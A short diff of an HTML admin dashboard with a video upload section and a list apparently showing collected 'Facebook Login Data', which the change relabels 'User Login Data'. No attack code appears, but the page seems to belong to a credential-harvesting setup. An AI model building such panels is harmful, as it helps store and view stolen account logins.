@@ -1,19 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Admin Panel</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="style.css">
 </head>
-<body>
-  <h1>Admin Dashboard</h1>
-  <h2>Upload Video</h2>
-  <input type="file" id="videoUpload" accept="video/*" />
-  <button onclick="uploadVideo()">Upload</button>
-  <h2>Uploaded Videos</h2>
-  <div id="adminVideoContainer"></div>
-  <h2>Facebook Login Data</h2>
-  <div id="credentialsList"></div>
+<body class="admin-page">
+  <header>
+    <h1>Admin Dashboard</h1>
+    <button onclick="logout()">Log Out</button>
+  </header>
+
+  <main>
+    <section class="upload-section">
+      <h2>Upload Video</h2>
+      <input type="file" id="videoUpload" accept="video/*">
+      <button onclick="uploadVideo()">Upload Video</button>
+    </section>
+
+    <section class="videos-section">
+      <h2>Uploaded Videos</h2>
+      <div id="adminVideoContainer"></div>
+    </section>
+
+    <section class="users-section">
+      <h2>User Login Data</h2>
+      <div id="credentialsList"></div>
+    </section>
+  </main>
+
   <script src="script.js"></script>
 </body>
 </html>
